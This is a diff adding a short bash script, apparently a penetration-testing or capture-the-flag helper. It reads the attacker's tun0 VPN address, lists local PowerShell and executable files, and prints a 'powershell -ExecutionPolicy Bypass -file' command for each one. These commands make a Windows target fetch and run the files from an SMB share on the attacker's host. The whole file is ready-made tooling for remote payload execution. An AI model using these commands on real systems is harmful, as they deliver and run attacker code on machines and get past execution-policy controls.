@@ -1,0 +1,12 @@
+#!/bin/bash
+#pwed = powershell web
+path1=$(pwd | sed 's/.*windows//g')
+path=$(echo $path1 | sed 's/\\//g')
+echo $path
+tun0=$(/sbin/ifconfig tun0 | grep 'inet' | head -1 | awk '{print $2}')
+for f in *{ps1,exe}; do
+
+	echo "powershell -ExecutionPolicy Bypass -file \\\\$tun0\wpriv\\$path\\$f"
+done
+
+#find $(pwd) -type f -name "*{ps1" -exec readlink -f {} \;
